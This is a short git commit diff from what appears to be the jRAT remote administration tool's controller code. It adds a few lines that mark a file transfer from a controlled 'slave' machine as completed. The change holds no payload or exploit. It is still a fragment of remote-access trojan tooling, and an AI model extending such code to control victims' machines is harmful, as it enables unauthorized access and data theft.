475bfda817a833c413e72910ce2fbdbaa9ae8f9b
redpois0n <red@cmail.nu>
2015-04-08 01:08:27 +0200

    Marks downloads as completed correctly

--- Controller/src/se/jrat/controller/packets/incoming/Packet31CompleteServerDownload.java
+++ Controller/src/se/jrat/controller/packets/incoming/Packet31CompleteServerDownload.java
@@ -3,6 +3,8 @@ package se.jrat.controller.packets.incoming;
 import java.io.DataInputStream;
 
 import se.jrat.common.io.FileCache;
+import se.jrat.common.io.TransferData;
+import se.jrat.common.io.TransferData.State;
 import se.jrat.controller.Slave;
 
 
@@ -11,6 +13,9 @@ public class Packet31CompleteServerDownload extends AbstractIncomingPacket {
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		String file = slave.readLine();
+		
+		TransferData data = FileCache.get(file);
+		data.setState(State.COMPLETED);
 		FileCache.clear(file);
 	}
 
